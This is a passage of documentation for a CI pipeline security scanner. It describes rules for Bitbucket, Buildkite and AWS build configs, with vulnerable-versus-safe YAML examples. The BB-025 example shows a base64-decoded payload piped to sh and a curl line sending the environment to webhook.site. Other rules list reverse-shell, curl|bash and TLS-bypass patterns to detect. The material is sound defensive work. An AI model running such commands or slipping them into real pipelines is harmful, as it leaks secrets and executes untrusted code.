- Typosquat and mirror-replay supply-chain incidents (the broad class behind event-stream, ua-parser-js, and tj-actions): the attacker substitutes a package whose name + version match a legitimate one but whose supplier differs. SBOMs with supplier attribution let downstream consumers detect the substitution by comparing publisher identity; SBOMs without it carry no signal at all.

**Source:** [`ATTEST-007`](../providers/oci.md#attest-007) in the [OCI manifest provider](../providers/oci.md).

### `BB-001`: pipe: action not pinned to exact version <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-001 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Bitbucket pipes are docker-image references. Major-only (`:1`) or missing tags let Atlassian/the publisher swap the image contents. Full semver or sha256 digest is required.

**Recommendation.** Pin every `pipe:` to a full semver tag (e.g. `atlassian/aws-s3-deploy:1.4.0`) or to an immutable SHA. Floating majors like `:1` can roll to new code silently.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: ``atlassian/aws-s3-deploy:1`` resolves to
# whatever the publisher's latest 1.x image is at job
# start. A publisher takeover (compromised Atlassian
# Marketplace account, leaked token) repoints the tag
# silently; every consumer's pipeline executes the new
# image on the next run.
pipelines:
  default:
    - step:
        script:
          - pipe: atlassian/aws-s3-deploy:1
            variables: { ... }

# Safe: pin to an exact version (``X.Y.Z``). Renovate /
# Dependabot's bitbucket-pipe ecosystem bumps these in
# reviewable PRs.
pipelines:
  default:
    - step:
        script:
          - pipe: atlassian/aws-s3-deploy:1.7.0
            variables: { ... }
```

**Source:** [`BB-001`](../providers/bitbucket.md#bb-001) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-004`: Deploy step missing `deployment:` environment gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-004 }

**Evidences:** [`ENF-1`](#ctrl-enf-1) L2: Enforce security policy of OSS usage (block on violation).

**How this is detected.** A step whose name or invoked pipe matches `deploy` / `release` / `publish` / `promote` should declare a `deployment:` field so Bitbucket enforces deployment-scoped variables, approvals, and history.

**Recommendation.** Add `deployment: production` (or `staging` / `test`) to the step. Configure the matching environment in the repo's Deployments settings with required reviewers and secured variables.

**Source:** [`BB-004`](../providers/bitbucket.md#bb-004) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-006 }

**Evidences:** [`REB-2`](#ctrl-reb-2) L4: Digitally sign rebuilt / produced OSS artifacts.

**How this is detected.** Unsigned artifacts can't be verified downstream. Passes when cosign / sigstore / slsa-* / notation-sign appears in the pipeline body.

**Recommendation.** Add a step that runs `cosign sign` against the built image or archive, using Bitbucket OIDC for keyless signing where possible. Publish the signature next to the artifact and verify it at deploy time.

**Source:** [`BB-006`](../providers/bitbucket.md#bb-006) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-007 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** Without an SBOM, downstream consumers can't audit the dependency set shipped in the artifact. Passes when CycloneDX / syft / anchore / sbom-tool / Trivy-SBOM appears.

**Recommendation.** Add an SBOM step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM as a build artifact.

**Source:** [`BB-007`](../providers/bitbucket.md#bb-007) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-009`: pipe: pinned by version rather than sha256 digest <span class="pg-sev pg-sev--low">LOW</span> { #detail-bb-009 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** BB-001 fails floating tags at HIGH; BB-009 is the stricter tier. Even immutable-looking semver tags can be repointed by the registry; sha256 digests are tamper-evident.

**Recommendation.** Resolve each pipe to its digest (`docker buildx imagetools inspect bitbucketpipelines/<name>:<ver>`) and reference it via `@sha256:<digest>`.

**Source:** [`BB-009`](../providers/bitbucket.md#bb-009) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-014`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-014 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a pipeline. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: pip uses a plaintext-HTTP index and
# ``--trusted-host`` silences hash verification on the
# named host. A network attacker swaps wheels in flight.
pipelines:
  default:
    - step:
        image: python:3.12-slim
        script:
          - pip install --index-url http://internal-pypi.example.com/simple \
              --trusted-host internal-pypi.example.com -r requirements.txt

# Safe: HTTPS + ``--require-hashes``. Internal CA installed
# in the image's trust store.
pipelines:
  default:
    - step:
        image: python:3.12-slim@sha256:abc123...
        script:
          - pip install --index-url https://internal-pypi.example.com/simple \
              --require-hashes -r requirements.txt
```

**Source:** [`BB-014`](../providers/bitbucket.md#bb-014) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-015`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-015 }

**Evidences:** [`SCA-1`](#ctrl-sca-1) L1: Scan OSS for known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`BB-015`](../providers/bitbucket.md#bb-015) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-021 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-021`](../providers/bitbucket.md#bb-021) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-022 }

**Evidences:** [`UPD-2`](#ctrl-upd-2) L3: Enable automated OSS updates (Dependabot / Renovate).

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR pipeline (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`BB-022`](../providers/bitbucket.md#bb-022) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-023 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: ``npm config set strict-ssl false`` (or
# ``git config http.sslverify false`` / ``NODE_TLS_
# REJECT_UNAUTHORIZED=0``) disables certificate
# verification for the duration. A network attacker MITMs
# the registry and ships substituted tarballs.
pipelines:
  default:
    - step:
        image: node:20@sha256:abc123...
        script:
          - npm config set strict-ssl false
          - npm install

# Safe: install the missing CA into the image's trust
# store; keep strict-ssl on.
pipelines:
  default:
    - step:
        image: node:20@sha256:abc123...
        script:
          - cp /etc/ssl/internal-ca.crt /usr/local/share/ca-certificates/
          - update-ca-certificates
          - npm install
```

**Source:** [`BB-023`](../providers/bitbucket.md#bb-023) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-024 }

**Evidences:** [`REB-4`](#ctrl-reb-4) L4: Digitally sign SBOMs produced (attested provenance).

**How this is detected.** Bitbucket has no native SLSA builder; self-hosted attestation via ``cosign attest`` or ``witness run`` is the usual path. Pipes like ``atlassian/cosign-attest`` (if published) would also match.

**Recommendation.** Add a step that runs ``cosign attest`` against a ``provenance.intoto.jsonl`` statement, or integrate the TestifySec ``witness run`` attestor. Artifact signing alone (BB-006) doesn't satisfy SLSA Build L3.

**Source:** [`BB-024`](../providers/bitbucket.md#bb-024) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-025`: Pipeline contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-bb-025 }

**Evidences:** [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Specific indicators only (reverse shells, base64-decoded execution, miner binaries, Discord/Telegram webhooks, credential-dump pipes, audit-erasure commands). Does not replace BB-014 (TLS bypass) or BB-013 (Docker insecure), those are hygiene; this is evidence.

**Recommendation.** Treat as a potential compromise. Identify the PR that added the matching step(s), rotate any credentials referenced from the pipeline's variable groups, and audit recent builds.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Proof of exploit.**

```
# Vulnerable: a step body executes a base64-decoded
# payload, exfils to a third-party webhook, or runs a
# known miner binary. A malicious PR (or a compromised
# maintainer) lands the payload in the pipeline file;
# every subsequent build executes it.
pipelines:
  default:
    - step:
        script:
          - echo Z2g6Li4uIA== | base64 -d | sh
          - curl https://webhook.site/abc?env=$(env|base64)

# Safe: the pipeline does only what the pipeline does.
# No obfuscated execution, no exfil POSTs, no
# base64 -d | sh pipelines. If a check fires it's a
# compromise or a CTF fixture; treat as incident response.
pipelines:
  default:
    - step:
        script:
          - make build
```

**Source:** [`BB-025`](../providers/bitbucket.md#bb-025) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-027`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-027 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Complements BB-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs bypass the registry integrity controls the lockfile relies on.

**Recommendation.** Pin git dependencies to a commit SHA. Publish private packages to an internal registry instead of installing from a filesystem path or tarball URL.

**Source:** [`BB-027`](../providers/bitbucket.md#bb-027) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-029`: image: (step or service) not pinned by sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-029 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** BB-001 / BB-009 only inspect ``pipe:`` references inside ``script:`` lists. Step ``image:`` directives and ``definitions.services.<name>.image:`` define the runtime container the build executes inside (and the auxiliary containers the step talks to over the loopback network). Both surfaces ship code into the build context, a compromised service image (the postgres container, the selenium-grid container, …) can exfiltrate every secret the step touches just as easily as the step image itself. This rule reuses ``_primitives.image_pinning.classify`` so the floating-tag semantics match GHA-001 / GL-001 / JF-009 / ADO-009 / CC-003 / K8S-001.

**Recommendation.** Resolve every ``image:`` reference to its current digest (``docker buildx imagetools inspect <ref>`` or ``crane digest <ref>``) and pin via ``image: name@sha256:<digest>``. Floating tags (``:latest``, ``:3``, no tag) silently swap the runtime image, the build's reproducibility invariant is broken and a registry-side compromise lands inside CI without any local change.

**Known false positives.**

- Bitbucket-vendored helper images (``atlassian/`` namespace) are still treated as third-party, the registry can move the tag. Pin them too rather than suppressing the rule globally.

**Proof of exploit.**

```
# Vulnerable: ``image: python:3.12-slim`` is a mutable
# tag. Docker Hub's image team rebuilds it on every
# Python point release; a publisher takeover ships code
# into every Bitbucket pipeline that uses the tag.
pipelines:
  default:
    - step:
        image: python:3.12-slim
        script:
          - pytest

# Safe: pin to the content-addressable digest. The pin
# documents which version the digest corresponded to so
# bumps stay reviewable.
pipelines:
  default:
    - step:
        image: python@sha256:abc123...  # python:3.12.1-slim
        script:
          - pytest
```

**Source:** [`BB-029`](../providers/bitbucket.md#bb-029) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-030`: npm install without registry-signature verification step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-030 }

**Evidences:** [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Fires once per ``bitbucket-pipelines.yml`` when:

1. Some step's ``script:`` runs an npm or pnpm install verb (``npm ci``, ``npm install``, ``npm i``, ``pnpm install``, ``pnpm i``, ``pnpm ci``);
2. No step anywhere in the file runs ``npm audit signatures`` or ``pnpm audit signatures``.

Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primitive is npm-CLI-specific (Yarn Berry's ``yarn npm audit`` does not yet verify registry trusted-publisher records). Pairs with the per-package lockfile rules NPM-002 / NPM-006.

**Recommendation.** Add an ``npm audit signatures`` step (or ``pnpm audit signatures``) after the install. Lockfile pinning only guarantees the bytes installed match the lockfile; ``audit signatures`` is what verifies those bytes were signed by the registry's trusted publisher for the package. Run it as a separate script line after ``npm ci`` and before any code from ``node_modules/`` executes.

**Known false positives.**

- Pipelines that build against a private registry without trusted-publisher records (legacy Artifactory, self-hosted Verdaccio without sigstore) cannot run ``audit signatures`` meaningfully. Suppress on the specific pipeline with a rationale that names the private registry.

**Seen in the wild.**

- Shai-Hulud npm worm (2026) / TanStack / axios patch-release compromises rode the gap between lockfile-pinned integrity and registry-signed-publisher provenance.

**Source:** [`BB-030`](../providers/bitbucket.md#bb-030) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-031`: pip install without `--require-hashes` verification <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-031 }

**Evidences:** [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** Fires once per ``bitbucket-pipelines.yml`` when some step's ``script:`` runs a real ``pip install`` (excluding the tooling-bootstrap allowlist) AND no step in the file uses ``--require-hashes`` or a hash-pinning manager (``uv sync`` / ``poetry install`` / ``pipenv install --deploy``).

**Recommendation.** Pin every dependency with a SHA-256 hash and install with ``pip install -r requirements.txt --require-hashes``, or migrate to a manager that hash-pins by default: ``uv sync``, ``poetry install``, ``pipenv install --deploy``. Hash-pinned install is the PyPI equivalent of npm's lockfile-integrity guarantee.

**Known false positives.**

- Pipelines that build against a private index without SHA-256 hash records cannot run ``--require-hashes`` meaningfully. Suppress with a rationale that names the private index.

**Seen in the wild.**

- PyPI maintainer-account compromises (ctx 2022, requests-darwin-lite 2024) shipped malicious sdists / wheels under existing version pins.

**Source:** [`BB-031`](../providers/bitbucket.md#bb-031) in the [Bitbucket provider](../providers/bitbucket.md).

### `BK-001`: Buildkite plugin not pinned to an exact version <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bk-001 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Buildkite resolves plugin refs at agent boot. ``foo#v1.2.3`` locks the version; ``foo#main`` / ``foo`` does not. Detection fires on bare names, branch keywords, and partial-semver pins (``v4``, ``v4.13``).

**Recommendation.** Pin every plugin reference to an exact tag (``docker-compose#v4.13.0``) or a 40-char commit SHA. Bare references (``docker-compose``), branch refs (``#main`` / ``#master``), and major-only floats (``#v4``) resolve to whatever is current at agent start time, which lets a compromised plugin release execute inside the pipeline.

**Proof of exploit.**

```
# Vulnerable: ``docker-compose#main`` resolves at agent
# boot to whatever sits at the plugin repo's main branch.
# A push to the plugin repo (legitimate maintainer commit,
# leaked token, takeover) ships code into every Buildkite
# job that uses the plugin.
steps:
  - label: ":docker: build"
    plugins:
      - docker-compose#main:
          run: app

# Safe: pin to a release tag (or a 40-char commit SHA).
# Renovate / Dependabot's buildkite-plugin ecosystem bumps
# these in reviewable PRs so the pin doesn't drift.
steps:
  - label: ":docker: build"
    plugins:
      - docker-compose#v4.13.0:
          run: app
```

**Source:** [`BK-001`](../providers/buildkite.md#bk-001) in the [Buildkite provider](../providers/buildkite.md).

### `BK-004`: Remote script piped into shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-004 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Uses the cross-provider ``_primitives.remote_script_exec`` detector shared with GHA-016 / GL-016 / GCB-010 / DF-004 / ARGO-008 / TKN-008. Catches ``curl|bash``, ``curl|sh``, ``wget|bash``, ``bash -c "$(curl …)"``, ``python -c urllib.urlopen``, ``curl > x.sh && bash x.sh``, and the PowerShell ``irm | iex`` variants. Use ``curl -fsSLO <url>; sha256sum -c install.sh.sha256; bash install.sh`` instead.

**Recommendation.** Download the installer to disk, verify a checksum or signature, then execute it. ``curl ... | sh`` lets the remote host change what runs in your pipeline at any time, and any TLS / DNS error during download silently feeds a partial script to the shell.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: ``curl | bash`` trusts both the network path
# (any MITM substitutes the script) and the host (a
# compromised installer endpoint silently serves attacker
# code). The script runs in the build's shell context.
steps:
  - label: ":hammer: install tools"
    command: |
      curl -fsSL https://installer.example.com/cli.sh | bash
      ./cli build

# Safe: download to a file, verify a sha256 digest from a
# trusted source, then execute. If the upstream content
# changes the digest stops matching and the build fails
# before the malicious code runs.
steps:
  - label: ":hammer: install tools"
    command: |
      curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
      echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
      bash /tmp/cli.sh
      ./cli build
```

**Source:** [`BK-004`](../providers/buildkite.md#bk-004) in the [Buildkite provider](../providers/buildkite.md).

### `BK-007`: Deploy step not gated by a manual block / input <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-007 }

**Evidences:** [`ENF-1`](#ctrl-enf-1) L2: Enforce security policy of OSS usage (block on violation).

**How this is detected.** A step is treated as a deploy when its label, key, or any command line contains a deploy keyword (``deploy``, ``ship``, ``release``, ``promote``, ``apply``, ``rollout``, ``terraform apply``, ``kubectl apply``, ``helm upgrade``, ``aws ecs update-service``). The check passes when at least one preceding step in the same pipeline file is a ``block:`` or ``input:`` flow-control step.

**Recommendation.** Insert a ``- block: "Deploy?"`` (or ``- input:`` step) in front of every deploy step. Buildkite waits for a human to click *Unblock* before the gated steps run, which prevents an unreviewed merge from auto-deploying to production. Combine with ``branches: main`` so the gate only appears on release branches.

**Known false positives.**

- Pipelines where the deploy gate lives in a triggered pipeline rather than the local file, the local pipeline looks ungated even though the actual deploy is gated downstream. Add a no-op ``block:`` to silence.

**Source:** [`BK-007`](../providers/buildkite.md#bk-007) in the [Buildkite provider](../providers/buildkite.md).

### `BK-008`: TLS verification disabled in step command <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-008 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Uses the cross-provider ``_primitives.tls_bypass`` detector so detection stays aligned with GHA-027 / GL-023 / JF-022 / ADO-026 / CC-024 / GCB-011 / DR-006. Covers curl / wget / git / npm / yarn / pip / helm / kubectl / ssh / docker / maven / gradle / aws bypasses. Partial-word matches (``--insecure-protocols``) are excluded.

**Recommendation.** Drop ``curl -k`` / ``--insecure``, ``wget --no-check-certificate``, ``git -c http.sslVerify=false``, and ``pip install --trusted-host``. If a CA isn't trusted, install it into the agent's trust store (``update-ca-certificates``) rather than disabling validation pipeline-wide. A compromised intermediate that strips TLS gets a free hand with every fetch the step performs.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BK-008`](../providers/buildkite.md#bk-008) in the [Buildkite provider](../providers/buildkite.md).

### `BK-009`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-009 }

**Evidences:** [`REB-2`](#ctrl-reb-2) L4: Digitally sign rebuilt / produced OSS artifacts.

**How this is detected.** Unsigned artifacts can't be verified downstream, a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-github-generator, slsa-framework, and notation-sign as signing tools, matching the shared signing-token catalog used by the other CI packs.

**Recommendation.** Add a signing step, install cosign once (``brew install cosign`` in the agent image, or a ``cosign-install`` plugin) and call ``cosign sign --yes <ref>`` after the build. For container images pushed to ECR / GCR / GHCR, the same call signs by digest. Publish the signature alongside the artifact and verify it at consumption time.

**Source:** [`BK-009`](../providers/buildkite.md#bk-009) in the [Buildkite provider](../providers/buildkite.md).

### `BK-010`: No SBOM generated for build artifacts <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-010 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** An SBOM (CycloneDX or SPDX) records every component baked into the build. Without one, post-incident triage can't answer ``did this CVE ship?`` for a given artifact. Detection uses the shared SBOM-token catalog, syft, cyclonedx, cdxgen, spdx-tools, microsoft/sbom-tool.

**Recommendation.** Add an SBOM-generation step. ``syft <artifact> -o cyclonedx-json > sbom.json`` runs in any standard agent image; ``cyclonedx-cli`` and ``cdxgen`` are alternative producers. Upload the SBOM via ``buildkite-agent artifact upload`` so downstream consumers (and incident-response tooling) can match deployed artifacts to the components they were built from.

**Source:** [`BK-010`](../providers/buildkite.md#bk-010) in the [Buildkite provider](../providers/buildkite.md).

### `BK-011`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-011 }

**Evidences:** [`REB-4`](#ctrl-reb-4) L4: Digitally sign SBOMs produced (attested provenance).

**How this is detected.** Provenance generation is distinct from signing. A signed artifact proves *who* published it; a provenance attestation proves *where / how* it was built. Without it, a leaked signing key forges identity but a leaked build environment also forges provenance. You need both for the SLSA L3 non-falsifiability guarantee. Detection uses the shared provenance-token catalog (``slsa-framework``, ``cosign attest``, ``in-toto``, ``attest-build-provenance``).

**Recommendation.** Run ``cosign attest --predicate slsa.json`` (or the SLSA-framework generator from a build-time step) after the build completes. The predicate records the build inputs and the agent that produced the artifact. Publish the attestation alongside the artifact so consumers can verify *how* it was built, not just *who* signed it.

**Source:** [`BK-011`](../providers/buildkite.md#bk-011) in the [Buildkite provider](../providers/buildkite.md).

### `BK-012`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-012 }

**Evidences:** [`SCA-1`](#ctrl-sca-1) L1: Scan OSS for known vulnerabilities.

**How this is detected.** Vulnerability scanning sits at a different layer from signing and SBOM. It answers ``does this artifact ship a known CVE?`` rather than ``can we verify what it is?``. Detection uses the shared vuln-scan-token catalog: trivy, grype, snyk, npm-audit, pip-audit, anchore, dependency-check, checkov, semgrep.

**Recommendation.** Add a vulnerability scanner, ``trivy fs .`` for source / filesystem, ``trivy image <ref>`` for container images, ``grype`` and ``snyk`` for either. Add ``npm audit`` / ``pip-audit`` for language-specific dep audits. Fail the step on findings above a chosen severity so a regression blocks the merge instead of shipping.

**Source:** [`BK-012`](../providers/buildkite.md#bk-012) in the [Buildkite provider](../providers/buildkite.md).

### `BK-013`: Deploy step has no branches: filter <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bk-013 }

**Evidences:** [`ENF-1`](#ctrl-enf-1) L2: Enforce security policy of OSS usage (block on violation).

**How this is detected.** A step is treated as a deploy when its label, key, or any command line contains a deploy keyword (``deploy``, ``ship-it``, ``release``, ``promote``, ``rollout``, ``helm upgrade``, ``kubectl apply``, ``terraform apply``, ``aws ecs update-service``, ``aws lambda update-function-code``, ``gcloud run deploy``). The check passes when the step declares ``branches:`` with at least one literal branch name (a wildcard like ``"*"`` is treated as an explicit opt-out, not a passing filter, and still trips). The pipeline-level default also counts, top-level ``steps:`` with ``branches:`` propagates.

**Recommendation.** Add ``branches: "main release/*"`` (or your release branch glob) to every deploy step. Buildkite skips the step on any other branch, which prevents a feature-branch PR from accidentally promoting code to production. Combine with BK-007's manual ``block:`` so a release branch *plus* a human approval is the path to deploy.

**Known false positives.**

- Trunk-based teams that branch-protect ``main`` and treat every merge as a deploy candidate may not use ``branches:``. Add ``branches: main`` to make the policy explicit, or ignore BK-013 in ``.pipeline-check-ignore.yml`` with a scope of ``main``-only repos.

**Source:** [`BK-013`](../providers/buildkite.md#bk-013) in the [Buildkite provider](../providers/buildkite.md).

### `CA-001`: CodeArtifact domain not encrypted with customer KMS CMK <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ca-001 }

**Evidences:** [`REB-2`](#ctrl-reb-2) L4: Digitally sign rebuilt / produced OSS artifacts.

**How this is detected.** AWS-owned encryption (the default ``alias/aws/codeartifact`` key) keeps the key policy under AWS's control, not yours. That's fine for confidentiality but means cross-account auditability of every Decrypt event lives with AWS, and you can't revoke or scope key access without recreating the domain. A customer-managed CMK puts both controls back in your hands.

**Recommendation.** Recreate the CodeArtifact domain with an encryption-key argument pointing at a customer-managed CMK. Domain encryption is set at creation and cannot be changed after.

**Source:** [`CA-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CA-002`: CodeArtifact repository has a public external connection <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ca-002 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization, [`ING-3`](#ctrl-ing-3) L1: Have the capability to deny-list specific vulnerable / malicious OSS.

**How this is detected.** An external connection to ``public:npmjs`` / ``public:pypi`` / ``public:nuget`` / ``public:maven-central`` fetches packages from the public registry on first resolution. A typo-squat (``request`` vs ``requests``) or a compromised upstream lands in the cache the first time anyone names it; every subsequent build pulls the cached substitute. The pull-through cache with an allow-list is the same risk shape solved by an explicit allowlist.

**Recommendation.** Route public package consumption through a pull-through cache repository governed by an allow-list of package names, and point build-time repos at that cache rather than directly at ``public:npmjs``/``public:pypi``. Unscoped public upstreams expose builds to dependency-confusion and typosquatting attacks.

**Source:** [`CA-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `CB-005`: Outdated managed build image <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cb-005 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Only AWS-managed ``aws/codebuild/standard:N.0`` images are version-checked. Custom or third-party images pass here, CB-009 handles the separate concern of tag vs digest pinning for custom images.

**Recommendation.** Update the CodeBuild environment image to aws/codebuild/standard:7.0 or later to ensure the build environment receives the latest security patches.

**Known false positives.**

- One version behind the current ``aws/codebuild/standard`` is a hygiene warning, not a production issue, and defaults to MEDIUM confidence. The rule emits HIGH only when the project is two or more versions behind. Custom or third-party images are not version-checked here; CB-009 handles tag-vs-digest pinning for those.

